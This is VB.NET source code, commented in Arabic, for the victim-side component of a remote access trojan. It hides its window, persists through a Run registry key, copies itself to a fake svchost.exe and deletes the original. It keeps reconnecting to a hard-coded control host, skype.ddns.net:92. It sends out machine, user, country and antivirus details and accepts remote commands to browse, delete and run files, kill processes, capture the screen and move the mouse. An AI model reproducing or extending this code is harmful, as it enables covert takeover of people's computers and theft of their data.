Imports System.Globalization ' الفضاء الذي سساعدنا على جلب اسم الدوله
Imports System.IO
Public Class Form1
    Public cap As New CRDP
    Dim yy As String = "||"
    Public WithEvents c As New SocketClient 'تعريف متغير من السوكت
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1) ' متغير محفوظ فيه اسم الدوله
    Dim host As String = "skype.ddns.net" ' الهوست او الاي بي
    Dim port As Integer = 92  'البورت


    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        End
    End Sub



    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        'اخفاء الفورم
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        'بدأ  الاتصال
        Timer1.Start()

        Try
            Dim StartupKey As String = "azoz"
            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
        Catch : End Try

        If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
            End If
        Else
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
            End If
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                End
            Else
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                End
            End If
        End If



    End Sub
    Private Sub data(ByVal b As Byte()) Handles c.Data
        Dim ala As String() = Split(BS(b), "||") ' اريه من نوع سترينغ تقسم البانات القادمه اعتمادا على "||"
        'جمله شرطيه بالاعتماد على اول كلمه يرسلها الكلاينت
        Try
            Select Case ala(0)
                Case "\\"
                    c.Send("\\")
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
                        allProcess += Proc.ProcessName & "ProcessSplit" & Proc.Id & "ProcessSplit" & Proc.SessionId & "ProcessSplit" & Proc.MainWindowTitle & "ProcessSplit"
                    Next
                    c.Send("ProcessManager" & yy & allProcess)
                Case "KillProcess"
                    Dim eachprocess As String() = ala(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next

                Case "info"
                    c.Send("info" & "||" & "myID" & "||" & Environment.MachineName & "||" & Environment.UserName & "||" & My.Computer.Info.OSFullName & "||" & country & "||" & getanti())
                Case "GetDrives"
                    c.Send("FileManager" & "||" & getDrives())
                Case "FileManager"
                    Try
                        c.Send("FileManager" & "||" & getFolders(ala(1)) & getFiles(ala(1)))
                    Catch
                        c.Send("FileManager" & "||" & "Error")
                    End Try

                Case "Delete"
                    Select Case ala(1)
                        Case "Folder"
                            IO.Directory.Delete(ala(2))
                        Case "File"
                            IO.File.Delete(ala(2))
                    End Select
                Case "Execute"
                    Process.Start(ala(1))
                Case "Rename"
                    Select Case ala(1)
                        Case "Folder"
                            My.Computer.FileSystem.RenameDirectory(ala(2), ala(3))
                        Case "File"
                            My.Computer.FileSystem.RenameFile(ala(2), ala(3))
                    End Select
                Case "openfm"
                    c.Send("openfm")
                Case "!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    c.Send("!" & yy & s.Width & yy & s.Height)
                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = ala(1)
                    Dim Split As Integer = ala(2)
                    Dim Quality As Integer = ala(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    c.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(ala(1), ala(2))
                    mouse_event(ala(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(ala(1), ala(2))

            End Select
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        'جمله شرطيه تفيد اذا لم يكن السيرفر متصل فعاود الاتصال
        If c.Statconnected = False Then
            c.Connect(host, port)
        End If
    End Sub
End Class
